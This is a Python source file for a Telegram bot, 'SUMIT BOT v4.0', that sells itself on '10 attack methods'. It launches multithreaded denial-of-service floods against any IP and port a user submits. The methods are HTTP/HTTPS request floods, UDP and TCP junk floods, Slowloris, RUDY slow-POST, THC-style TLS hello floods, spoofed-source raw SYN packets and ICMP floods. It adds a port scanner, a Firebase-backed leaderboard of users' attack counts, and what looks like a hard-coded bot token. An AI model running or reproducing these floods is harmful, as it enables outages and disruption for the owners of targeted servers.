#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════╗
║     SUMIT BOT v4.0 - USER       ║
╠══════════════════════════════════╣
║ 10 Attack Methods | 15+ Tools   ║
║ Inline Keyboard | No Admin Btn  ║
╚══════════════════════════════════╝
"""
import telebot, threading, time, socket, base64, requests as req, os, uuid, json, random, hashlib, struct, urllib.parse, warnings
from telebot import types
from datetime import datetime, timedelta
warnings.filterwarnings('ignore')

# ===== CONFIG =====
BOT_TOKEN = "8859712974:AAEtM8x8Ac0xNVrjM55dKyAfQugz_wgNmVE"
ADMIN_ID = 8931155476
ADMIN_USER = "@SUMIT_X_OFFICIAL"
FIREBASE_URL = "https://hihehdhd-15a54-default-rtdb.asia-southeast1.firebasedatabase.app"
MAX_ATT = 999999999
BOT_OWNER = "SUMIT"
# ==================

bot = telebot.TeleBot(BOT_TOKEN)
active_attacks = {}
user_data = {}

# ===== DATABASE =====
class DB:
    def __init__(self,u): self.u=u.rstrip('/')
    def r(self,m,p,d=None):
        try: r=req.request(m,f"{self.u}/{p}.json",json=d,timeout=10); return r.json() if r.text else {}
        except: return None
    def add(self,uid,un="Unknown"):
        if not self.r("GET",f"users/{uid}"):
            self.r("PUT",f"users/{uid}",{"username":un,"user_id":uid,"first":datetime.now().isoformat(),"att":0,"ban":False,"reason":"","plan":"free"})
    def get(self,uid): return self.r("GET",f"users/{uid}")
    def up_att(self,uid,c): self.r("PUT",f"users/{uid}/att",c)
    def att(self,uid): u=self.get(uid); return u.get("att",0) if u else 0
    def ban(self,uid,r=""): self.r("PATCH",f"users/{uid}",{"ban":True,"reason":r})
    def unban(self,uid): self.r("PATCH",f"users/{uid}",{"ban":False,"reason":""})
    def banned(self,uid): u=self.get(uid); return u.get("ban",False) if u else False
    def all(self): return self.r("GET","users") or {}
    def logs(self,uid): return self.r("GET",f"logs/{uid}") or {}
    def add_log(self,uid,target,method,status):
        lid=str(uuid.uuid4())[:8]
        self.r("PUT",f"logs/{uid}/{lid}",{"target":target,"method":method,"time":datetime.now().isoformat(),"status":status})
    def top_users(self,limit=15):
        u=self.all()
        if not u: return []
        return sorted([(uid,d) for uid,d in u.items() if isinstance(d,dict)],key=lambda x: x[1].get("att",0),reverse=True)[:limit]
    def total_users(self): u=self.all(); return len(u) if u else 0
    def total_attacks(self):
        u=self.all(); t=0
        if u:
            for uid,d in u.items():
                if isinstance(d,dict): t+=d.get("att",0)
        return t

db = DB(FIREBASE_URL)

# ===== MAIN KEYBOARD (16 BUTTONS - INLINE, NO ADMIN BUTTON) =====
def mk():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("💥 ATTACK",callback_data="attack"),
        types.InlineKeyboardButton("📊 STATS",callback_data="stats")
    )
    markup.add(
        types.InlineKeyboardButton("🌐 IP LOOKUP",callback_data="ip"),
        types.InlineKeyboardButton("🔍 DNS LOOKUP",callback_data="dns")
    )
    markup.add(
        types.InlineKeyboardButton("🛡️ PORT SCAN",callback_data="port"),
        types.InlineKeyboardButton("🔗 URL SHORTEN",callback_data="short")
    )
    markup.add(
        types.InlineKeyboardButton("🌀 QR CODE",callback_data="qr"),
        types.InlineKeyboardButton("🔑 HASH GEN",callback_data="hash")
    )
    markup.add(
        types.InlineKeyboardButton("🔄 BASE64",callback_data="b64"),
        types.InlineKeyboardButton("🌍 WHOIS",callback_data="whois")
    )
    markup.add(
        types.InlineKeyboardButton("✅ WEB CHECK",callback_data="web"),
        types.InlineKeyboardButton("👤 UA GEN",callback_data="ua")
    )
    markup.add(
        types.InlineKeyboardButton("📋 MY INFO",callback_data="info"),
        types.InlineKeyboardButton("🏆 TOP USERS",callback_data="top")
    )
    markup.add(
        types.InlineKeyboardButton("📚 HELP",callback_data="help"),
        types.InlineKeyboardButton(f"👑 {BOT_OWNER}",url=f"tg://openmessage?user_id={ADMIN_ID}")
    )
    return markup

def attack_kb():
    markup = types.InlineKeyboardMarkup(row_width=2)
    methods = [
        ("🌊 HTTP", "a_http"), ("🌊 UDP", "a_udp"), ("🌊 TCP", "a_tcp"),
        ("🌊 SLOWLORIS", "a_slow"), ("🌊 THC", "a_thc"), ("🌊 RUDY", "a_rudy"),
        ("🌊 SYN", "a_syn"), ("🌊 ICMP", "a_icmp"), ("🌊 HTTPS", "a_https"),
        ("🌊 MIXED", "a_mixed")
    ]
    for t,c in methods: markup.add(types.InlineKeyboardButton(t,callback_data=c))
    markup.add(types.InlineKeyboardButton("🔙 BACK",callback_data="main"))
    return markup

# ===== ATTACK METHODS =====
def launch_attack(target,port,duration,uid,method_name,method_func):
    end=time.time()+duration
    count=[0]
    def worker():
        while time.time()<end and uid in active_attacks:
            try: method_func(target,port,uid,count); count[0]+=1
            except: count[0]+=1
    threads=[threading.Thread(target=worker,daemon=True) for _ in range(500)]
    for t in threads: t.start()
    for t in threads: t.join(timeout=duration+2)

def atk_http(t,p,uid,c):
    agents=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15","Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36","Mozilla/5.0 (compatible; Googlebot/2.1)","curl/8.4.0","Wget/1.21"]
    refs=["https://google.com/","https://facebook.com/","https://twitter.com/","https://github.com/","https://reddit.com/","https://youtube.com/"]
    paths=["/","/index.html","/wp-admin","/login","/admin","/api","/test","/config","/backup","/xmlrpc.php","/.env","/wp-login.php"]
    try:
        url=f"http://{t}:{p}{random.choice(paths)}"
        hdrs={"User-Agent":random.choice(agents),"Referer":random.choice(refs),"Accept":"*/*","Accept-Encoding":"gzip, deflate","Connection":"keep-alive","X-Forwarded-For":f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
        if random.random()<0.5: req.get(url,headers=hdrs,timeout=3,verify=False)
        else: req.post(url,headers=hdrs,data={"x":"y"*100},timeout=3,verify=False)
    except: pass

def atk_udp(t,p,uid,c):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        s.sendto(random._urandom(random.randint(1024,65507)),(t,p)); s.close()
    except: pass

def atk_tcp(t,p,uid,c):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(3); s.connect((t,p)); s.send(random._urandom(4096)); s.close()
    except: pass

def atk_slow(t,p,uid,c):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(10); s.connect((t,p))
        s.send(f"GET /?{random.randint(1,999999)} HTTP/1.1\r\nHost: {t}\r\n".encode())
        for _ in range(20):
            if uid not in active_attacks: break
            s.send(f"X-{random.randint(1,999)}: {random.randint(1,999)}\r\n".encode()); time.sleep(5)
        s.close()
    except: pass

def atk_thc(t,p,uid,c):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(5); s.connect((t,p if p else 443))
        s.send(bytes.fromhex('16030100'+hex(random.randint(50,200))[2:]+'010000'+hex(random.randint(50,200))[2:]+'0303'+''.join(random.choice('0123456789abcdef') for _ in range(64))+'000000')); s.close()
    except: pass

def atk_rudy(t,p,uid,c):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(10); s.connect((t,p))
        body="x"*100000
        s.send(f"POST / HTTP/1.1\r\nHost: {t}\r\nContent-Length: {len(body)}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n".encode())
        for b in body[:5000]:
            if uid not in active_attacks: break
            s.send(b.encode()); time.sleep(0.05)
        s.close()
    except: pass

def atk_syn(t,p,uid,c):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
        src=f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        ip_h=struct.pack('!BBHHHBBH4s4s',0x45,0,40,0,0,64,socket.IPPROTO_TCP,0,socket.inet_aton(src),socket.inet_aton(t))
        tcp_h=struct.pack('!HHLLBBHHH',random.randint(1024,65535),p,random.randint(0,4294967295),0,0x50,0x02,65535,0,0)
        s.sendto(ip_h+tcp_h,(t,0)); s.close()
    except: pass

def atk_icmp(t,p,uid,c):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
        pid=os.getpid()&0xFFFF; data=random._urandom(128)
        hdr=struct.pack('!BBHHH',8,0,0,pid,0); pkt=hdr+data
        chk=0; pkt_b=pkt if len(pkt)%2==0 else pkt+b'\x00'
        for i in range(0,len(pkt_b),2): chk+=(pkt_b[i]<<8)+pkt_b[i+1]
        chk=~((chk>>16)+(chk&0xFFFF))&0xFFFF
        s.sendto(struct.pack('!BBHHH',8,0,chk,pid,0)+data,(t,0)); s.close()
    except: pass

def atk_https(t,p,uid,c):
    agents=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"]
    try: req.get(f"https://{t}:{p if p else 443}/",headers={"User-Agent":random.choice(agents),"Accept":"*/*"},timeout=5,verify=False)
    except: pass

def atk_mixed(t,p,uid,c):
    m=random.choice([atk_http,atk_udp,atk_tcp,atk_slow,atk_thc,atk_https])
    try: m(t,p,uid,c)
    except: pass

ATTACK_METHODS = {
    "a_http":("HTTP",atk_http), "a_udp":("UDP",atk_udp), "a_tcp":("TCP",atk_tcp),
    "a_slow":("SLOWLORIS",atk_slow), "a_thc":("THC",atk_thc), "a_rudy":("RUDY",atk_rudy),
    "a_syn":("SYN",atk_syn), "a_icmp":("ICMP",atk_icmp), "a_https":("HTTPS",atk_https),
    "a_mixed":("MIXED",atk_mixed)
}

# ===== TOOLS =====
def ip_lookup(ip):
    try:
        r=req.get(f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query,mobile,proxy,hosting",timeout=10)
        if r.status_code==200:
            d=r.json()
            if d.get("status")=="success":
                return f"🌐 *IP GEO INFO*\n━━━━━━━━━━━━━━━━━━━\n📍 *IP:* `{d['query']}`\n🌍 *Country:* {d.get('country','?')} ({d.get('countryCode','?')})\n🏙️ *City:* {d.get('city','?')}\n🏢 *ISP:* {d.get('isp','?')}\n📡 *AS:* {d.get('as','?')}\n📍 *Coords:* `{d.get('lat','?')},{d.get('lon','?')}`\n📱 *Mobile:* {'Yes' if d.get('mobile') else 'No'}\n🔒 *Proxy/VPN:* {'Yes' if d.get('proxy') else 'No'}\n━━━━━━━━━━━━━━━━━━━"
        return "❌ *Failed*"
    except Exception as e: return f"❌ *Error:* `{e}`"

def dns_lookup(dom):
    try:
        r=req.get(f"https://dns.google/resolve?name={dom}&type=ALL",timeout=10)
        if r.status_code==200:
            data=r.json()
            lines=[f"🔍 *DNS RECORDS:* `{dom}`","━━━━━━━━━━━━━━━━━━━"]
            for ans in data.get("Answer",[]): lines.append(f"📌 *{ans.get('type','?')}:* `{ans.get('data','?')}`")
            lines.append("━━━━━━━━━━━━━━━━━━━")
            return "\n".join(lines)
        return "❌ *Failed*"
    except Exception as e: return f"❌ *Error:* `{e}`"

def port_scan(t):
    common=[21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1521,2049,3306,3389,5432,5900,6379,8080,8443,9000,10000,27017]
    openp=[]; lock=threading.Lock()
    def check(p):
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(0.5)
            if s.connect_ex((t,p))==0:
                try: svc=socket.getservbyport(p)
                except: svc="unknown"
                with lock: openp.append((p,svc))
            s.close()
        except: pass
    threads=[threading.Thread(target=check,args=(p,),daemon=True) for p in common]
    for th in threads: th.start()
    for th in threads: th.join(timeout=2)
    if not openp: return f"🔍 *PORT SCAN:* `{t}`\n━━━━━━━━━━━━━━━━━━━\n❌ No open ports\n━━━━━━━━━━━━━━━━━━━"
    lines=[f"🔍 *PORT SCAN:* `{t}`","━━━━━━━━━━━━━━━━━━━"]
    for p,svc in sorted(openp,key=lambda x:x[0]): lines.append(f"✅ *Port {p}:* `{svc.upper()}`")
    lines.append("━━━━━━━━━━━━━━━━━━━")
    return "\n".join(lines)

def shorten(url):
    try:
        r=req.get(f"https://tinyurl.com/api-create.php?url={url}",timeout=10)
        if r.status_code==200: return f"🔗 *SHORTENER*\n━━━━━━━━━━━━━━━━━━━\n📤 `{r.text.strip()}`\n━━━━━━━━━━━━━━━━━━━"
        return "❌ *Failed*"
    except: return "❌ *Error*"

def qr_gen(txt):
    return f"https://api.qrserver.com/v1/create-qr-code/?size=500x500&data={urllib.parse.quote(txt)}&margin=10"

def hash_gen(txt):
    r=f"🔑 *HASHES*\n━━━━━━━━━━━━━━━━━━━\n📥 `{txt}`\n\n"
    r+=f"*MD5:*\n`{hashlib.md5(txt.encode()).hexdigest()}`\n\n"
    r+=f"*SHA1:*\n`{hashlib.sha1(txt.encode()).hexdigest()}`\n\n"
    r+=f"*SHA256:*\n`{hashlib.sha256(txt.encode()).hexdigest()}`\n\n"
    r+=f"*SHA512:*\n`{hashlib.sha512(txt.encode()).hexdigest()}`\n\n"
    r+=f"*SHA3-256:*\n`{hashlib.sha3_256(txt.encode()).hexdigest()}`\n\n"
    r+="━━━━━━━━━━━━━━━━━━━"
    return r

def b64_conv(txt,mode):
    try:
        if mode=="enc": out=base64.b64encode(txt.encode()).decode()
        else: out=base64.b64decode(txt).decode()
        return f"🔄 *BASE64 {'ENCODE' if mode=='enc' else 'DECODE'}*\n━━━━━━━━━━━━━━━━━━━\n📤 `{out}`\n━━━━━━━━━━━━━━━━━━━"
    except: return "❌ *Invalid*"

def whois_lookup(dom):
    try:
        r=req.get(f"https://who-dat.as93.net/{dom}",timeout=15)
        if r.status_code==200:
            data=r.json()
            lines=[f"🌍 *WHOIS:* `{dom}`","━━━━━━━━━━━━━━━━━━━"]
            for k,v in data.items():
                if isinstance(v,str) and v and len(v)<200: lines.append(f"📌 *{k}:* `{v}`")
                elif isinstance(v,dict):
                    for sk,sv in v.items():
                        if isinstance(sv,str) and sv and len(sv)<200: lines.append(f"📌 *{sk}:* `{sv}`")
            lines.append("━━━━━━━━━━━━━━━━━━━")
            return "\n".join(lines)
        return "❌ *Failed*"
    except: return "❌ *Error*"

def web_check(url):
    if not url.startswith("http"): url="http://"+url
    try:
        r=req.get(url,timeout=15,allow_redirects=True,headers={"User-Agent":"Mozilla/5.0"})
        lines=[f"✅ *WEB CHECK:* `{url}`","━━━━━━━━━━━━━━━━━━━"]
        lines.append(f"📊 *Status:* `{r.status_code}`")
        lines.append(f"📏 *Size:* `{len(r.content):,} bytes`")
        lines.append(f"⚡ *Time:* `{r.elapsed.total_seconds():.2f}s`")
        lines.append(f"🖥️ *Server:* `{r.headers.get('Server','N/A')}`")
        lines.append(f"📄 *Type:* `{r.headers.get('Content-Type','N/A')}`")
        lines.append(f"🔗 *Final:* `{r.url}`")
        for h in ['X-Powered-By','X-AspNet-Version']:
            if h in r.headers: lines.append(f"⚙️ *{h}:* `{r.headers[h][:60]}`")
        lines.append("━━━━━━━━━━━━━━━━━━━")
        return "\n".join(lines)
    except Exception as e: return f"❌ *Error:* `{e}`"

def random_ua():
    uas=[
        ("Chrome","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
        ("Firefox","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"),
        ("Edge","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"),
        ("Safari","Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"),
        ("Opera","Opera/9.80 (Windows NT 10.0; Win64; x64) Presto/2.12.388 Version/12.18"),
        ("Chrome Mac","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
        ("Chrome Linux","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
        ("Android","Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")
    ]
    b,ua=random.choice(uas)
    return f"👤 *UA GENERATOR*\n━━━━━━━━━━━━━━━━━━━\n🌐 *Browser:* `{b}`\n📝 *UA:* `{ua}`\n━━━━━━━━━━━━━━━━━━━"

# ===== BOT COMMANDS =====
@bot.message_handler(commands=['start'])
def start_cmd(m):
    uid=m.from_user.id
    db.add(uid,m.from_user.username or "Unknown")
    bot.send_message(m.chat.id,f"""🚀 *SUMIT BOT v4.0* 🚀

━━━━━━━━━━━━━━━━━━━
👤 *Made by:* `{BOT_OWNER}`
🆔 *Your ID:* `{uid}`
👋 *Welcome:* `{m.from_user.first_name or 'User'}`

🔥 *10 ATTACK METHODS*
🛠️ *15+ INTEGRATED TOOLS*
━━━━━━━━━━━━━━━━━━━

💡 *Use buttons below!*""",parse_mode="Markdown",reply_markup=mk())

@bot.message_handler(commands=['help'])
def help_cmd(m):
    if db.banned(m.from_user.id): return
    bot.send_message(m.chat.id,f"""📚 *SUMIT BOT v4.0 - HELP*

━━━━━━━━━━━━━━━━━━━
🔥 *10 ATTACK METHODS:*
HTTP • UDP • TCP • SLOWLORIS
THC • RUDY • SYN • ICMP
HTTPS • MIXED

🛠️ *15+ TOOLS:*
IP Lookup • DNS Lookup • Port Scan
URL Shorten • QR Code • Hash Gen
Base64 • WHOIS • Web Check • UA Gen
My Info • Top Users

━━━━━━━━━━━━━━━━━━━
👤 *Made by:* `{BOT_OWNER}`""",parse_mode="Markdown",reply_markup=mk())

# ===== CALLBACK HANDLER =====
@bot.callback_query_handler(func=lambda c:True)
def cb(c):
    uid=c.from_user.id; cid=c.message.chat.id; mid=c.message.message_id
    if db.banned(uid): return bot.answer_callback_query(c.id,"❌ Banned!",show_alert=True)
    d=c.data
    
    if d=="main":
        bot.edit_message_text("🚀 *SUMIT BOT v4.0*\n━━━━━━━━━━━━━━━━━━━\n✅ *Select feature:*",cid,mid,parse_mode="Markdown",reply_markup=mk())
        bot.answer_callback_query(c.id)
    elif d=="help":
        bot.edit_message_text(f"📚 *HELP*\n━━━━━━━━━━━━━━━━━━━\n🔥 10 attacks\n🛠️ 15 tools\n━━━━━━━━━━━━━━━━━━━\n👤 *{BOT_OWNER}*",cid,mid,parse_mode="Markdown",reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK",callback_data="main")))
        bot.answer_callback_query(c.id)
    elif d=="attack":
        bot.edit_message_text("💥 *SELECT ATTACK:*",cid,mid,parse_mode="Markdown",reply_markup=attack_kb())
        bot.answer_callback_query(c.id)
    elif d in ATTACK_METHODS:
        mname,mfunc=ATTACK_METHODS[d]
        user_data[uid]={"action":"atk_target","method":mname,"func":mfunc}
        bot.edit_message_text(f"⚔️ *{mname} FLOOD*\n━━━━━━━━━━━━━━━━━━━\nSend `IP:PORT`\nExample: `1.1.1.1:80`\n\nAttacks left: `{MAX_ATT-db.att(uid)}`",cid,mid,parse_mode="Markdown",reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK",callback_data="attack")))
        bot.answer_callback_query(c.id)
    elif d=="stats":
        my=db.att(uid); t=db.total_attacks(); u=db.total_users(); r=1
        al=db.all()
        if al:
            su=sorted([(uid2,d2.get("att",0)) for uid2,d2 in al.items() if isinstance(d2,dict)],key=lambda x:x[1],reverse=True)
            for i,(u2,_) in enumerate(su,1):
                if int(u2)==uid: r=i; break
        bot.edit_message_text(f"📊 *STATS*\n━━━━━━━━━━━━━━━━━━━\n👤 `{uid}`\n💥 Attacks: `{my}`\n🏆 Rank: `#{r}`\n👥 Users: `{u}`\n💣 Total: `{t}`\n━━━━━━━━━━━━━━━━━━━",cid,mid,parse_mode="Markdown",reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK",callback_data="main")))
        bot.answer_callback_query(c.id)
    elif d=="ip":
        user_data[uid]={"action":"ip"}
        bot.edit_message_text("🌐 *IP LOOKUP*\nSend IP:",cid,mid,parse_mode="Markdown",reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK",callback_data="main")))
        bot.answer_callback_query(c.id)
    elif d=="dns":
        user_data[uid]={"action":"dns"}
        bot.edit_message_text("🔍 *DNS LOOKUP*\nSend domain:",cid,mid,parse_mode="Markdown",reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK",callback_data="main")))
        bot.answer_callback_query(c.id)
    elif d=="port":
        user_data[uid]={"action":"port"}
        bot.edit_message_text("🛡️ *PORT SCAN*\nSend IP:",cid,mid,parse_mode="Markdown",reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK",callback_data="main")))
        bot.answer_callback_query(c.id)
    elif d=="short":
        user_data[uid]={"action":"short"}
        bot.edit_message_text("🔗 *URL SHORTEN*\nSend URL:",cid,mid,parse_mode="Markdown",reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK",callback_data="main")))
        bot.answer_callback_query(c.id)
    elif d=="qr":
        user_data[uid]={"action":"qr"}
        bot.edit_message_text("🌀 *QR CODE*\nSend text/URL:",cid,mid,parse_mode="Markdown",reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK",callback_data="main")))
        bot.answer_callback_query(c.id)
    elif d=="hash":
        user_data[uid]={"action":"hash"}
        bot.edit_message_text("🔑 *HASH GEN*\nSend text:",cid,mid,parse_mode="Markdown",reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK",callback_data="main")))
        bot.answer_callback_query(c.id)
    elif d=="b64":
        mu=types.InlineKeyboardMarkup(row_width=2)
        mu.add(types.InlineKeyboardButton("🔐 ENCODE",callback_data="b64_e"),types.InlineKeyboardButton("🔓 DECODE",callback_data="b64_d"),types.InlineKeyboardButton("🔙 BACK",callback_data="main"))
        bot.edit_message_text("🔄 *BASE64*",cid,mid,parse_mode="Markdown",reply_markup=mu)
        bot.answer_callback_query(c.id)
    elif d=="b64_e":
        user_data[uid]={"action":"b64_e"}; bot.edit_message_text("🔄 *ENCODE*\nSend text:",cid,mid,parse_mode="Markdown",reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK",callback_data="b64")))
        bot.answer_callback_query(c.id)
    elif d=="b64_d":
        user_data[uid]={"action":"b64_d"}; bot.edit_message_text("🔄 *DECODE*\nSend base64:",cid,mid,parse_mode="Markdown",reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK",callback_data="b64")))
        bot.answer_callback_query(c.id)
    elif d=="whois":
        user_data[uid]={"action":"whois"}; bot.edit_message_text("🌍 *WHOIS*\nSend domain:",cid,mid,parse_mode="Markdown",reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK",callback_data="main")))
        bot.answer_callback_query(c.id)
    elif d=="web":
        user_data[uid]={"action":"web"}; bot.edit_message_text("✅ *WEB CHECK*\nSend URL:",cid,mid,parse_mode="Markdown",reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK",callback_data="main")))
        bot.answer_callback_query(c.id)
    elif d=="ua":
        res=random_ua()
        bot.edit_message_text(res,cid,mid,parse_mode="Markdown",reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔄 NEW",callback_data="ua"),types.InlineKeyboardButton("🔙 BACK",callback_data="main")))
        bot.answer_callback_query(c.id)
    elif d=="info":
        d2=db.get(uid); atts=d2.get("att",0) if d2 else 0; plan=d2.get("plan","free") if d2 else "free"
        lc=len(db.logs(uid)) if db.logs(uid) else 0
        bot.edit_message_text(f"📋 *MY PROFILE*\n━━━━━━━━━━━━━━━━━━━\n🆔 `{uid}`\n📛 @{c.from_user.username or 'N/A'}\n💥 `{atts}` attacks\n💎 `{plan.upper()}` plan\n📜 `{lc}` logs\n━━━━━━━━━━━━━━━━━━━\n👤 *{BOT_OWNER}*",cid,mid,parse_mode="Markdown",reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK",callback_data="main")))
        bot.answer_callback_query(c.id)
    elif d=="top":
        top=db.top_users(15)
        if not top: bot.edit_message_text("🏆 *No users*",cid,mid,parse_mode="Markdown",reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK",callback_data="main")))
        else:
            txt="🏆 *TOP 15 USERS*\n━━━━━━━━━━━━━━━━━━━\n"
            medals=["🥇","🥈","🥉"]
            for i,(uid2,d2) in enumerate(top,1):
                m=medals[i-1] if i<=3 else f"#{i}"
                txt+=f"{m} `{uid2}` @{d2.get('username','?')} — `{d2.get('att',0)}`\n"
            txt+="━━━━━━━━━━━━━━━━━━━"
            bot.edit_message_text(txt,cid,mid,parse_mode="Markdown",reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK",callback_data="main")))
        bot.answer_callback_query(c.id)

# ===== TEXT HANDLER =====
@bot.message_handler(func=lambda m:True)
def txt(m):
    uid=m.from_user.id; text=m.text.strip()
    if db.banned(uid): return bot.reply_to(m,"❌ *Banned!*",parse_mode="Markdown")
    
    if uid in user_data:
        a=user_data[uid].get("action","")
        
        if a=="atk_target":
            mn=user_data[uid]["method"]; mf=user_data[uid]["func"]
            target=text; port=80
            if ":" in text:
                parts=text.split(":"); target=parts[0].strip()
                try: port=int(parts[1].strip())
                except: pass
            if db.att(uid)>=MAX_ATT: return bot.reply_to(m,f"❌ *Limit!* Used `{db.att(uid)}/{MAX_ATT}`",parse_mode="Markdown")
            user_data[uid]={"action":"atk_dur","method":mn,"func":mf,"target":target,"port":port}
            bot.reply_to(m,f"⚔️ *{mn}*\n🎯 `{target}:{port}`\n\n⏱️ *Duration (sec):*\n10-300",parse_mode="Markdown")
            return
        
        if a=="atk_dur":
            try: dur=int(text)
            except: return bot.reply_to(m,"❌ *Invalid number!*",parse_mode="Markdown")
            if dur<10 or dur>300: return bot.reply_to(m,"❌ *10-300 only!*",parse_mode="Markdown")
            target=user_data[uid]["target"]; port=user_data[uid]["port"]
            mn=user_data[uid]["method"]; mf=user_data[uid]["func"]
            
            if uid in active_attacks: return bot.reply_to(m,"❌ *Already attacking!*",parse_mode="Markdown")
            active_attacks[uid]=True
            
            msg=bot.reply_to(m,f"⚔️ *ATTACK STARTED!*\n━━━━━━━━━━━━━━━━━━━\n🎯 `{target}:{port}`\n⚔️ `{mn} FLOOD`\n⏱️ `{dur}s`\n━━━━━━━━━━━━━━━━━━━\n🔥 *Attacking...*",parse_mode="Markdown")
            
            def attack_thread():
                try: launch_attack(target,port,dur,uid,mn,mf)
                except: pass
                if uid in active_attacks: del active_attacks[uid]
                db.up_att(uid,db.att(uid)+1)
                db.add_log(uid,f"{target}:{port}",mn,"Done")
                try: bot.edit_message_text(f"✅ *ATTACK COMPLETE!*\n━━━━━━━━━━━━━━━━━━━\n🎯 `{target}:{port}`\n⚔️ `{mn} FLOOD`\n━━━━━━━━━━━━━━━━━━━\n🔥 *Made by:* `{BOT_OWNER}`",m.chat.id,msg.message_id,parse_mode="Markdown",reply_markup=mk())
                except: pass
            
            threading.Thread(target=attack_thread,daemon=True).start()
            del user_data[uid]
            return
        
        if a=="ip": bot.reply_to(m,ip_lookup(text),parse_mode="Markdown",reply_markup=mk()); del user_data[uid]; return
        if a=="dns": bot.reply_to(m,dns_lookup(text),parse_mode="Markdown",reply_markup=mk()); del user_data[uid]; return
        if a=="port":
            bot.reply_to(m,"🔍 Scanning...",parse_mode="Markdown")
            bot.reply_to(m,port_scan(text),parse_mode="Markdown",reply_markup=mk()); del user_data[uid]; return
        if a=="short": bot.reply_to(m,shorten(text),parse_mode="Markdown",reply_markup=mk()); del user_data[uid]; return
        if a=="qr":
            u=qr_gen(text)
            if u: bot.send_photo(m.chat.id,u,caption=f"🌀 *QR:* `{text}`\n👤 *{BOT_OWNER}*",parse_mode="Markdown",reply_markup=mk())
            else: bot.reply_to(m,"❌ *Failed*",reply_markup=mk())
            del user_data[uid]; return
        if a=="hash": bot.reply_to(m,hash_gen(text),parse_mode="Markdown",reply_markup=mk()); del user_data[uid]; return
        if a=="b64_e": bot.reply_to(m,b64_conv(text,"enc"),parse_mode="Markdown",reply_markup=mk()); del user_data[uid]; return
        if a=="b64_d": bot.reply_to(m,b64_conv(text,"dec"),parse_mode="Markdown",reply_markup=mk()); del user_data[uid]; return
        if a=="whois": bot.reply_to(m,whois_lookup(text),parse_mode="Markdown",reply_markup=mk()); del user_data[uid]; return
        if a=="web":
            bot.reply_to(m,"✅ Checking...",parse_mode="Markdown")
            bot.reply_to(m,web_check(text),parse_mode="Markdown",reply_markup=mk()); del user_data[uid]; return
        
        del user_data[uid]
    
    bot.reply_to(m,"❓ Use buttons or /help",parse_mode="Markdown",reply_markup=mk())

# ===== RUN =====
